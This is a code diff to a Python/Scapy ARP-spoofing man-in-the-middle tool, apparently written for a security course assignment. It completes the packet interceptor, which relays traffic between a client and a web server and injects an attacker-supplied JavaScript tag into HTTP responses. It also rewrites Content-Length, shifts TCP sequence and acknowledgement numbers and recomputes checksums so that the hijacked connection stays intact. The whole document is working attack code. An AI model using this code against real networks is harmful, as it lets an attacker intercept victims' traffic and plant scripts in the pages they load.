@@ -39,7 +39,7 @@ def spoof_thread(clientIP, clientMAC, serverIP, serverMAC, attackerIP, attackerM
         time.sleep(interval)
 
 
-# TODO: spoof ARP so that dst changes its ARP table entry for src 
+# TODO: spoof ARP so that dst changes its ARP table entry for src
 def spoof(src_ip, src_mac, dst_ip, dst_mac):
     debug(f"spoofing {dst_ip}'s ARP table: setting {src_ip} to {src_mac}")
     arp_pack = ARP(op=2, hwsrc=src_mac, psrc=src_ip, hwdst=dst_mac, pdst=dst_ip)
@@ -55,74 +55,108 @@ def restore(srcIP, srcMAC, dstIP, dstMAC):
 
 # TODO: handle intercepted packets
 def interceptor(packet):
-	global clientMAC, clientIP, serverMAC, serverIP, attackerMAC, script, clientSEQ, clientACK, serverSEQ, serverACK
+	global clientMAC, clientIP, serverMAC, serverIP, attackerMAC, script, clientSEQ, clientACK, serverSEQ, serverACK, flag
 	# The packet should only be intercepted if it's caused from a spoofed ARP table
 	if packet != None and packet.haslayer(IP) and packet.getlayer(Ether).src != attackerMAC and packet.getlayer(IP).src != attackerIP and packet.getlayer(IP).dst != attackerIP and packet.haslayer(TCP):
-		packet.show()
+		# Scapy has the power to automatically fill in any empty attributes in any of the layers. so delete the things that need updating, and Scapy will fill them in accordingly
+		del packet.getlayer(IP).len
+		del packet.getlayer(IP).chksum
+		del packet.getlayer(TCP).chksum
+		#packet.show()
 		if packet.getlayer(TCP).flags == "S":
 			debug(f"The above packet is an HTTP SYN packet!")
 			# Change the MAC addresses
 			packet.getlayer(Ether).src = attackerMAC
 			packet.getlayer(Ether).dst = serverMAC
-			#packet.show()
-			sendp(packet)
+			# Set flag to 0 (though it'll eventually be useless)
+			flag = 0
 		elif packet.getlayer(TCP).flags == "SA":
 			debug(f"The above packet is an HTTP SYN+ACK packet!")
 			# Change the MAC addresses
 			packet.getlayer(Ether).src = attackerMAC
 			packet.getlayer(Ether).dst = clientMAC
-			#packet.show()
-			sendp(packet)
 		elif packet.getlayer(TCP).flags == "A":
 			if packet.getlayer(Ether).src == clientMAC:
 				debug(f"The above packet is an HTTP ACK packet from client!")
 				# Change the MAC addresses
 				packet.getlayer(Ether).src = attackerMAC
 				packet.getlayer(Ether).dst = serverMAC
-				#packet.show()
-				sendp(packet)
+				if flag == 1:
+					debug(f"Original ACK is {packet[TCP].ack}")
+					debug(f"Original SEQ is {packet[TCP].seq}")
+					packet[TCP].ack -= (len(script)-7)
+					debug(f"Script length is {len(script)}")
+					debug(f"New ACK is {packet[TCP].ack}")
+					debug(f"New SEQ is {packet[TCP].seq}")
 			elif packet.getlayer(Ether).src == serverMAC:
 				debug(f"The above packet is an HTTP ACK packet from web server!")
 				# Change the MAC addresses
 				packet.getlayer(Ether).src = attackerMAC
 				packet.getlayer(Ether).dst = clientMAC
-				#packet.show()
-				sendp(packet)
 		elif packet.getlayer(TCP).flags == "PA":
 			if packet.getlayer(Ether).src == clientMAC:
 				debug(f"The above packet is an HTTP request packet!")
 				# Change the MAC addresses
 				packet.getlayer(Ether).src = attackerMAC
 				packet.getlayer(Ether).dst = serverMAC
-				#packet.show()
-				sendp(packet)
+				# Update the client's SEQ and ACK
+				clientSEQ = packet[TCP].seq
+				clientACK = packet[TCP].ack
 			elif packet.getlayer(Ether).src == serverMAC:
 				debug(f"The above packet is an HTTP response packet!")
+				debug(f"The old TCP length is {len(packet[Raw].load)}")
 				# Change the MAC addresses
 				packet.getlayer(Ether).src = attackerMAC
 				packet.getlayer(Ether).dst = clientMAC
 				# Inject the script in the response
 				new_html = packet[Raw].load.decode('ascii')
+				#debug(f"Old HTML is: {new_html}")
+				new_html = new_html.replace("</body>",script)
+				#debug(f"New HTML is: {new_html}")
+
+				# Change the content lenght in the payload
 				debug(f"Old HTML is: {new_html}")
-				new_html = new_html.replace("</html>",script)
+				end_index = new_html.find("Last-Modified:")
+				start_index = new_html.find("Content-Length:")
+				old_length = new_html[start_index+16:end_index-2]
+				debug(f"The thing we took out is: {old_length}")
+				new_length = int(old_length)+len(script)-7
+				new_html = new_html.replace("Content-Length: "+old_length,"Content-Length: "+str(new_length))
 				debug(f"New HTML is: {new_html}")
-				#packet.show()
-				sendp(packet)
+
+				packet[Raw].load = new_html
+				# Set flag to 1 (though it'll eventually be useless)
+				flag=1
+				debug(f"The new TCP length is {len(packet[Raw].load)}")
+				debug(f"Original ACK is {packet[TCP].ack}")
+				debug(f"Original SEQ is {packet[TCP].seq}")
 		elif packet.getlayer(TCP).flags == "FA":
 			if packet.getlayer(Ether).src == clientMAC:
 				debug(f"The above packet is an HTTP FIN+ACK packet from client!")
 				# Change the MAC addresses
 				packet.getlayer(Ether).src = attackerMAC
 				packet.getlayer(Ether).dst = serverMAC
-				#packet.show()
-				sendp(packet)
+				# Change the ACK value
+				debug(f"Original ACK is {packet[TCP].ack}")
+				debug(f"Original SEQ is {packet[TCP].seq}")
+				packet[TCP].ack -= (len(script)-7)
+				debug(f"Script length is {len(script)}")
+				debug(f"New ACK is {packet[TCP].ack}")
+				debug(f"New SEQ is {packet[TCP].seq}")
 			elif packet.getlayer(Ether).src == serverMAC:
 				debug(f"The above packet is an HTTP FIN+ACK packet from web server!")
 				# Change the MAC addresses
 				packet.getlayer(Ether).src = attackerMAC
 				packet.getlayer(Ether).dst = clientMAC
-				#packet.show()
-				sendp(packet)
+				# Change the SEQ value
+				debug(f"Original ACK is {packet[TCP].ack}")
+				debug(f"Original SEQ is {packet[TCP].seq}")
+				packet[TCP].seq += (len(script)-7)
+				debug(f"Script length is {len(script)}")
+				debug(f"New ACK is {packet[TCP].ack}")
+				debug(f"New SEQ is {packet[TCP].seq}")
+		#packet.show()
+		sendp(packet)
 
 if __name__ == "__main__":
     args = parse_arguments()
@@ -134,7 +168,7 @@ if __name__ == "__main__":
     attackerIP = get_if_addr(args.interface)
     clientIP = args.clientIP
     serverIP = args.serverIP
-    script = "<script>"+args.script+"</script></html>"
+    script = "<script>"+args.script+"</script></body>"
 
     attackerMAC = get_if_hwaddr(args.interface)
     debug(f"Attacker MAC is {attackerMAC}")
